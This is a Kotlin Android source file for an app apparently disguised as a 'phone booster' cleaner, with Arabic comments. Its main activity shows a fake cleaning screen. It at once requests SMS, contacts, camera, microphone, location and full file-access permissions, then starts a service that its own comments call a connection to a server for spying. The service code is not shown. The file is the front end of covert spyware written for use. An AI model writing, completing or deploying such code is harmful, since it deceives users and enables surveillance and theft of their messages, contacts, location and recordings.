package vivo.communication

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMISSIONS = arrayOf(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. تصميم واجهة تظهر خلف نافذة الصلاحيات
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.setBackgroundColor(Color.parseColor("#F0F4F8"))

        val title = TextView(this)
        title.text = "🚀 مسرع الهاتف"
        title.textSize = 28f
        title.setTypeface(null, Typeface.BOLD)
        title.setTextColor(Color.parseColor("#2C3E50"))
        title.gravity = Gravity.CENTER

        val subTitle = TextView(this)
        subTitle.text = "يرجى الموافقة على الصلاحيات لبدء التنظيف"
        subTitle.textSize = 16f
        subTitle.setTextColor(Color.parseColor("#7F8C8D"))
        subTitle.gravity = Gravity.CENTER
        subTitle.setPadding(0, 20, 0, 0)

        layout.addView(title)
        layout.addView(subTitle)
        setContentView(layout)

        // 2. طلب الأذونات فوراً بمجرد فتح التطبيق
        requestPermissions()
    }

    private fun requestPermissions() {
        val missing = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            // إظهار نافذة الموافقة على الصلاحيات
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        } else {
            // إذا كانت الصلاحيات موجودة مسبقاً، اطلب صلاحية الملفات
            requestStorageManager()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // بعد ما يوافق المستخدم، نطلب صلاحية إدارة الملفات (لأندرويد 11+)
        requestStorageManager()
    }

    private fun requestStorageManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } else {
                startSpyService()
            }
        } else {
            startSpyService()
        }
    }

    private fun startSpyService() {
        // 3. تشغيل خدمة الاتصال بالسيرفر (التجسس)
        val serviceIntent = Intent(this, WebSocketService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}